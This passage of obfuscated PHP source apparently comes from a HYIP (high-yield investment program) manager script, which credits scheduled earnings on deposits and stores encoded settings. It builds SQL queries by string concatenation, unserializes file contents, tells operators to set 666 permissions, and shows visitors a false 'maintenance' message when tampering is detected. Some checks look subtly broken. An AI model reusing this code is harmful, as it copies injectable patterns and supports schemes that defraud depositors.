      		actual_amount = ' . $elnlcJAjA . ',
                ec = ' . $elnlceJGNn[$elnlcFAei['elnlcBBUUo']] . ',
      		date = \'' . $elnlceJGNn[$elnlcFAei['elnlcLmKDQ']] . ('' . '\' + interval ' . $elnlcsTFJk . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlceJGNn[$elnlcFAei['elnlcaQNFH']] . ('' . ',
                description = \'' . $elnlcAWNv . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcrwQwF . ' and 
    	       (deposit_date + interval ' . $elnlcsTFJk . ' ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcsTFJk . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' ') . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlclxfTc . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcakaz, LOCK_UN);
      fclose ($elnlcakaz);
      unlink ('' . './tmpl_c/lock_user' . $elnlcrwQwF);
    }

  }

  function elnlcmpdmk ($elnlcRtuEV)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $elnlclgauu = array ();
    if (($elnlcGWAnG[$elnlcFAei['elnlcSybn']] == 1 AND $elnlcRtuEV != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcoQUP']]][$elnlctLoC[$elnlcFAei['elnlcaQNFH']]] = $elnlctLoC;
    }

    $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
    $elnlcNqTcg = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcRtuEV == -1)
    {
      $elnlcNqTcg = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcRtuEV . ' and status = \'on\'';
    }

    if ($elnlcRtuEV == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcOvqO = mysql_query ($q) OR print mysql_error ());
    while ($elnlcGOpLU = mysql_fetch_array ($elnlcOvqO))
    {
      $elnlcrwQwF = $elnlcGOpLU[$elnlcFAei['elnlcaQNFH']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcrwQwF;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
      while (0 < $elnlcAoGJj)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcrwQwF . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlcAoGJj = $elnlcFAei['elnlczkHC'];
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          ++$elnlcAoGJj;
          if (!isset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            continue;
          }

          $elnlcFrMj = $elnlcFAei['elnlczkHC'];
          $elnlcJlpP = $elnlcFAei['elnlczkHC'];
          reset ($elnlclgauu);
          reset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]);
          while (list ($elnlcrOrLz, $elnlcribAu) = each ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            if (($elnlcribAu[$elnlcFAei['elnlcxMcnh']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND ($elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlcribAu[$elnlcFAei['elnlcDBMK']] OR $elnlcribAu[$elnlcFAei['elnlcDBMK']] == 0)))
            {
              $elnlcFrMj = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND $elnlcFrMj == 0))
            {
              $elnlcFrMj = $elnlcJlpP;
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND 0 < $elnlcFrMj))
            {
              break;
            }

            $elnlcJlpP = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
          }

          if (($elnlcribAu[$elnlcFAei['elnlcDBMK']] != 0 AND $elnlcribAu[$elnlcFAei['elnlcDBMK']] < $elnlctLoC[$elnlcFAei['elnlcMFxj']]))
          {
            $elnlcFrMj = $elnlcJlpP;
          }

          $elnlcSImc = $elnlctLoC[$elnlcFAei['elnlcMFxj']] * $elnlcFrMj / 100;
          $elnlcJUVar = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcaMACl'])
          {
            $elnlcJUVar = ' 1 day ';
          }
          else
          {
            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'])
            {
              $elnlcJUVar = ' 1 hour ';
            }
            else
            {
              if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcIDbN'])
              {
                $elnlcJUVar = ' 7 day ';
              }
              else
              {
                if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == 'b-w')
                {
                  $elnlcJUVar = ' 14 day ';
                }
                else
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcrGCO'])
                  {
                    $elnlcJUVar = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcfrEd'])
                    {
                      $elnlcJUVar = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciknW'])
                      {
                        $elnlcJUVar = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlczIjDA'])
                        {
                          $elnlcJUVar = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciRoQ'])
                          {
                            $elnlcJUVar = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
                            {
                              $elnlcJUVar = ' ' . $elnlctLoC[$elnlcFAei['elnlcnqIKs']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcFrMj == 0 AND $elnlcJUVar == ''))
          {
            continue;
          }

          $elnlcMTqaD = -1;
          $q = 'select weekday(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') as dw');
          ($elnlcJPTW = mysql_query ($q) OR print mysql_error ());
          while ($elnlcRWVJ = mysql_fetch_array ($elnlcJPTW))
          {
            $elnlcMTqaD = $elnlcRWVJ[$elnlcFAei['elnlcrnJpI']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') and ')) . ' deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          ($elnlcQlFk = mysql_query ($q) OR print mysql_error ());
          $elnlczPoo = $elnlcFAei['elnlczkHC'];
          while ($elnlcCkfS = mysql_fetch_array ($elnlcQlFk))
          {
            $elnlczPoo = $elnlcCkfS[$elnlcFAei['elnlcFxzO']];
          }

          if ($elnlczPoo == 0)
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcMTqaD == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                    amount = ' . $elnlcSImc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] . number_format ($elnlctLoC[$elnlcFAei['elnlcMFxj']], 2) . ('' . ' - ' . $elnlcFrMj . ' %\',
                    actual_amount = ' . $elnlcSImc . ',
                    date = \'') . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcsfal = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
          {
            if (($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']])))
            {
              $elnlcsfal = ', status = \'off\'';
            }

            if (($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1 AND ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = ' . $elnlctLoC[$elnlcFAei['elnlcMFxj']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlctLoC[$elnlcFAei['elnlcMFxj']] . ',
                    ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100) AND $elnlctLoC[$elnlcFAei['elnlcepPbi']] == 1))
              {
                if ($elnlctLoC[$elnlcFAei['elnlcAjrwP']] == 0)
                {
                  $elnlctLoC[$elnlcFAei['elnlcAjrwP']] = $elnlctLoC[$elnlcFAei['elnlcMFxj']] + 1;
                }

                if (($elnlctLoC[$elnlcFAei['elnlcQwWv']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND $elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlctLoC[$elnlcFAei['elnlcAjrwP']]))
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcxKaI']] == 1)
                  {
                    $elnlcjKTz = preg_split ('/\\s*,\\s*/', $elnlctLoC[$elnlcFAei['elnlclPAj']]);
                    if (!in_array ($elnlctLoC[$elnlcFAei['elnlcdeOG']], $elnlcjKTz))
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcjKTz[0];
                    }
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcdeOG']] < $elnlctLoC[$elnlcFAei['elnlcapbeA']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcapbeA']];
                    }

                    if ($elnlctLoC[$elnlcFAei['elnlcnWEG']] < $elnlctLoC[$elnlcFAei['elnlcdeOG']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcnWEG']];
                    }
                  }
                }
                else
                {
                  $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcFAei['elnlczkHC'];
                }

                if ((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100))
                {
                  $elnlcJiba = $elnlcSImc * $elnlctLoC[$elnlcFAei['elnlcdeOG']] / 100;
                  $elnlcSImc = floor ((floor ($elnlcSImc * 100000) / 100000 - floor ($elnlcJiba * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                        amount = -' . $elnlcJiba . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcJiba . ',
                    		ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    		date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                                deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcJiba . ',
                    		actual_amount = actual_amount + ' . $elnlcJiba . '
                    		where id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlclvoy ($elnlctLoC[$elnlcFAei['elnlcaQNFH']], $elnlcSImc, 'date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJUVar . ' ' . $elnlcsfal . ' where id =' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcSQAa = mysql_query ($q);
      while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
      {
        $elnlcsTFJk = $elnlctLoC[$elnlcFAei['elnlcnqIKs']] + $elnlctLoC[$elnlcFAei['elnlcpSpq']] - (0 < $elnlctLoC[$elnlcFAei['elnlcpSpq']] ? 1 : 0);
        $elnlclxfTc = $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
        if ($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlclxfTc . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcrwQwF . ' and 
                (deposit_date + interval ' . $elnlcsTFJk . ' day < last_pay_date or deposit_date + interval ' . $elnlcsTFJk . ' day < now()) and
                ((' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' day < now())))
             ';
          $elnlcEDGJw = mysql_query ($q);
          while ($elnlceJGNn = mysql_fetch_array ($elnlcEDGJw))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlceJGNn[$elnlcFAei['elnlcbckB']] . ',
      		amount = ' . $elnlceJGNn[$elnlcFAei['elnlcMFxj']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlceJGNn[$elnlcFAei['elnlcMFxj']] . ',
                      ec = ' . $elnlceJGNn[$elnlcFAei['elnlcBBUUo']] . ',
      		date = \'' . $elnlceJGNn[$elnlcFAei['elnlcLmKDQ']] . ('' . '\' + interval ' . $elnlcsTFJk . ' day,
                      deposit_id = ') . $elnlceJGNn[$elnlcFAei['elnlcaQNFH']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcrwQwF . ' and 
    	       (deposit_date + interval ' . $elnlcsTFJk . ' day < last_pay_date or deposit_date + interval ' . $elnlcsTFJk . ' day < now()) and
             ((' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' = 0) || (' . $elnlctLoC[$elnlcFAei['elnlcOPMvh']] . ' && (deposit_date + interval ' . $elnlctLoC[$elnlcFAei['elnlcUkac']] . ' day < now()))) and
             type_id = ' . $elnlclxfTc . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlckjhp ($a)
  {
    global $elnlcFAei;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlcWzEs = file ($elnlcFAei['elnlcMUdj']);
    $t = chop ($elnlcWzEs[1]);
    $elnlcubgM = strlen ($t) / 2;
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcECcV = elnlcsfhkv (0, $elnlcubgM, $d);
    $j = $elnlcubgM;
    while (10 < $j)
    {
      $elnlcECcV = elnlcsfhkv ($elnlcECcV, $elnlcubgM, $d);
      $k .= $d[$elnlcECcV];
      $d[$elnlcECcV] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($elnlcEnBLl, $elnlckgVlf, $k) = split (':', $k, 3);
    if ($elnlcEnBLl != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlckgVlf = !md5 ($elnlcEnBLl . $elnlcqcAV))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlcFAei['elnlcrDeOO']]);
    $elnlcCFuWs = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcFAei['elnlcLOal']);
    $z[$elnlcFAei['elnlclKLjp']] = $elnlcCFuWs[$z[$elnlcFAei['elnlcdVspV']] - 1];
    if ($z[$elnlcFAei['elnlccSFap']] == 1)
    {
      $z[$elnlcFAei['elnlcoWgT']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlcFAei['elnlcdVspV']], $z[$elnlcFAei['elnlcPPjzG']], $z[$elnlcFAei['elnlcbGay']])) / 86400);
    }

    $z[$elnlcFAei['elnlcstJR']] = ($z[$elnlcFAei['elnlcbDeVV']] ? 1 : 0);
    $z[$elnlcFAei['elnlcbKloA']] = $z[$elnlcFAei['elnlcFoJP']];
    return $z;
  }

  function elnlcovfi ()
  {
    global $elnlcFAei;
    $elnlcrFemk = $elnlcFAei['elnlczkHC'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlcrFemk = $elnlcFAei['elnlcuNxfU'];
    }

    $s = array ();
    $elnlcWzEs = fopen ($elnlcFAei['elnlcqbzne'], $elnlcFAei['elnlcTVChH']);
    if ($elnlcWzEs)
    {
      while ($elnlcKltcj = fgets ($elnlcWzEs, 20000))
      {
        $elnlcKltcj = chop ($elnlcKltcj);
        if (($elnlcKltcj != '<?/*' AND $elnlcKltcj != '*/?>'))
        {
          $elnlcRJwG = $elnlcxfLi = '';
          list ($elnlcRJwG, $elnlcxfLi) = @split ('	', $elnlcKltcj, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcRJwG) AND $elnlcrFemk == 1) OR $elnlcrFemk == 0))
          {
            $s[$elnlcRJwG] = $elnlcxfLi;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlcWzEs);
    if ($elnlcrFemk == 1)
    {
      list ($elnlcKltcj, $elnlcUbCbt) = file ($elnlcFAei['elnlcuflG']);
      $elnlcuanbv = $elnlcKltcj;
      $elnlciqSbv = $elnlcFAei['elnlczkHC'];
      for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($elnlcuanbv); $i += 5)
      {
        $elnlciqSbv += hexdec (substr ($elnlcuanbv, $i, 5));
      }

      if ($s[$elnlcFAei['elnlcaVJi']] != $elnlciqSbv * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $elnlcKltcj = elnlcpewp ($elnlcKltcj, $s[$elnlcFAei['elnlcBgyc']]);
      $elnlcxIPHb = split ('
', $elnlcKltcj);
      for ($i = $elnlcFAei['elnlczkHC']; $i < sizeof ($elnlcxIPHb); ++$i)
      {
        list ($elnlcRJwG, $elnlcxfLi) = split ('	', $elnlcxIPHb[$i], 2);
        $s[$elnlcRJwG] = $elnlcxfLi;
      }
    }

    $elnlcCFuWs = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcFAei['elnlcLOal']);
    $s[$elnlcFAei['elnlclKLjp']] = $elnlcCFuWs[$s[$elnlcFAei['elnlcdVspV']] - 1];
    if ($s[$elnlcFAei['elnlccSFap']] == 1)
    {
      $s[$elnlcFAei['elnlcoWgT']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlcFAei['elnlcdVspV']], $s[$elnlcFAei['elnlcPPjzG']], $s[$elnlcFAei['elnlcbGay']])) / 86400);
    }

    $s[$elnlcFAei['elnlcrDeOO']] = sprintf ('%d', $s[$elnlcFAei['elnlcrDeOO']]);
    $s[$elnlcFAei['elnlcstJR']] = ($s[$elnlcFAei['elnlcbDeVV']] ? 1 : 0);
    $s[$elnlcFAei['elnlcbKloA']] = $s[$elnlcFAei['elnlcFoJP']];
    return $s;
  }

  function elnlcsetav ($a)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcqcAV = serialize ($elnlcGWAnG);
    $elnlcEnBLl = md5 ($elnlcqcAV);
    $elnlckgVlf = md5 ($elnlcEnBLl . $elnlcqcAV);
    $elnlcqcAV = $elnlcEnBLl . ':' . $elnlckgVlf . ':' . $elnlcqcAV;
    $elnlcqcAV .= chr (1) . chr (1) . chr (1);
    $elnlcubgM = strlen ($elnlcqcAV) + 121;
    $elnlcECcV = rand (1, 100000000000) % $elnlcubgM;
    $elnlcRyeAk = array ();
    $d = array ();
    for ($i = $elnlcFAei['elnlczkHC']; $i < $elnlcubgM; ++$i)
    {
      $d[$i] = -1;
      $elnlcRyeAk[$i] = -1;
    }

    $elnlcECcV = elnlcdefep (0, $elnlcubgM, $d);
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($elnlcqcAV); ++$i)
    {
      $elnlcECcV = elnlcdefep ($elnlcECcV, $elnlcubgM, $d);
      $d[$elnlcECcV] = substr ($elnlcqcAV, $i, 1);
    }

    for ($i = $elnlcFAei['elnlczkHC']; $i < $elnlcubgM; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlcWzEs = fopen ($elnlcFAei['elnlcjtCx'], $elnlcFAei['elnlcTQMsE']);
    $r = array ();
    fputs ($elnlcWzEs, '<?
');
    for ($i = $elnlcFAei['elnlczkHC']; $i < $elnlcubgM; ++$i)
    {
      fputs ($elnlcWzEs, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlcWzEs, '
?>');
    fclose ($elnlcWzEs);
  }

  function elnlcobcj ()
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlcrFemk = $elnlcFAei['elnlczkHC'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlcrFemk = $elnlcFAei['elnlcuNxfU'];
    }

    $elnlcWzEs = fopen ($elnlcFAei['elnlcqbzne'], $elnlcFAei['elnlcTQMsE']);
    reset ($elnlcGWAnG);
    fputs ($elnlcWzEs, '<?/*
');
    $elnlcuanbv = '';
    while (list ($elnlcRJwG, $elnlcxfLi) = each ($elnlcGWAnG))
    {
      if ($elnlcRJwG != 'logged')
      {
        if (($elnlcrFemk == 0 OR ($elnlcrFemk == 1 AND preg_match ('/^key/', $elnlcRJwG))))
        {
          if (!preg_match ('/_generated/', $elnlcRJwG))
          {
            fputs ($elnlcWzEs, (('' . $elnlcRJwG . '	') . $elnlcxfLi . '
'));
            $elnlcuanbv .= (('' . $elnlcRJwG . '	') . $elnlcxfLi . '
');
          }
        }

        $elnlcuanbv .= (('' . $elnlcRJwG . '	') . $elnlcxfLi . '
');
        continue;
      }
    }

    $elnlcuanbv = elnlcgzbyk ($elnlcuanbv, $elnlcGWAnG[$elnlcFAei['elnlcBgyc']]);
    $elnlciqSbv = $elnlcFAei['elnlczkHC'];
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($elnlcuanbv); $i += 5)
    {
      $elnlciqSbv += hexdec (substr ($elnlcuanbv, $i, 5));
    }

    $elnlciqSbv = $elnlciqSbv * 15;
    fputs ($elnlcWzEs, ('' . 'cnf	' . $elnlciqSbv . '
'));
    fputs ($elnlcWzEs, '*/?>
');
    fclose ($elnlcWzEs);
    if ($elnlcrFemk == 1)
    {
      $elnlcWzEs = fopen ($elnlcFAei['elnlcPAycS'], $elnlcFAei['elnlcTQMsE']);
      fputs ($elnlcWzEs, $elnlcuanbv);
      fclose ($elnlcWzEs);
    }

  }

